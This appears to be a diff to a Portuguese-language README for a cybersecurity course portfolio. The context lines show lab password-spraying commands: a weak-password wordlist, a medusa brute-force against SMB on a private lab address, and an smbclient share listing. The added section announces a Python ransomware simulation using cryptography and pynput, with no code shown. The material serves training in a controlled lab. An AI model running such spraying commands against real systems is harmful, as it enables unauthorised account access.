@@ -21,4 +21,12 @@
   - echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
   - medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
   - smbclient -L //192.168.56.101 -U msfadmin
-   
+
+______
+
+# DIO-Santander-Ciberseguran-a-2025 - Simulando Ransoware Em Amnbiente Controlado
+- Simulação de Ransowares comuns em ambiente controlado utilizando programação com bibliotecas Phyton como: cryptography  e pynput
+
+# Algumas das ferramentas utilizadas:
+- VSCode
+- Python
